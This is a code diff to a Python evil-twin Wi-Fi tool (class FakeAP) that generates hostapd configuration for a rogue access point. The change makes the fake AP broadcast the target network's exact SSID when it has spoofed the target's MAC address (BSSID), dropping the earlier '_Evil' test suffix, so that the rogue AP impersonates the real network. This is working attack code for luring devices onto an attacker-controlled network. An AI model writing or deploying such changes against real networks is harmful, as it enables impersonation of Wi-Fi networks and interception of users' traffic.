@@ -28,7 +28,7 @@ class FakeAP:
         self.mon_interface = None
         self.hostapd_proc = None
         self.dnsmasq_proc = None
-        #self.captive_portal_enabled = True
+        self.mac_spoofed = False
 
     def check_root(self):
         if os.geteuid() != 0:
@@ -154,23 +154,25 @@ class FakeAP:
         time.sleep(2)
         print(f"[+] Reverted to managed mode on {PHY_INTERFACE}")
 
-# Hosting the Fake AP , so devices can connect, 
+# Hosting the Fake AP , so devices can connect,
     def create_configs(self):
         print("[*] Generating hostapd config...")
-        
-        test_ssid = f"{self.target_ssid}_Evil" #using this so I can find the evil AP and connect
-        print(f"using test ssid: {test_ssid}")
-        
+
+        # Use exact SSID when MAC spoofing, otherwise add _Evil suffix for testing
+        if self.mac_spoofed:
+            ap_ssid = self.target_ssid
+        else:
+            ap_ssid = f"{self.target_ssid}_Evil"
+        print(f"using ssid: {ap_ssid}")
+
         hostapd_conf = f"""
 interface={PHY_INTERFACE}
 driver=nl80211
-#ssid={self.target_ssid}
 hw_mode=g
-ssid={test_ssid}
+ssid={ap_ssid}
 channel={self.target_channel}
 macaddr_acl=0
 auth_algs=1
-#ignore_broadcast_ssid=0
 """
         with open("hostapd.conf", "w") as f:
             f.write(hostapd_conf)
@@ -893,6 +895,7 @@ log-dhcp
             # MAC spoofing
             if self.should_mac_spoof():
                 self.spoof_mac(self.target_bssid)
+                self.mac_spoofed = True
 
             # Transition
             self.stop_monitor_mode()
@@ -904,20 +907,22 @@ log-dhcp
             self.setup_networking()
             
             print("[*] Generating hostapd config...")
-        
-            test_ssid = f"{self.target_ssid}_Evil" #using this so I can find the evil AP and connect
-            print(f"using test ssid: {test_ssid}")
+
+            # Use exact SSID when MAC spoofing, otherwise add _Evil suffix for testing
+            if self.mac_spoofed:
+                ap_ssid = self.target_ssid
+            else:
+                ap_ssid = f"{self.target_ssid}_Evil"
+            print(f"using ssid: {ap_ssid}")
         
             hostapd_conf = f"""
 interface={PHY_INTERFACE}
 driver=nl80211
-#ssid={self.target_ssid}
 hw_mode=g
-ssid={test_ssid}
+ssid={ap_ssid}
 channel={self.target_channel}
 macaddr_acl=0
 auth_algs=1
-#ignore_broadcast_ssid=0
 """
             with open("hostapd.conf", "w") as f:
             		f.write(hostapd_conf)
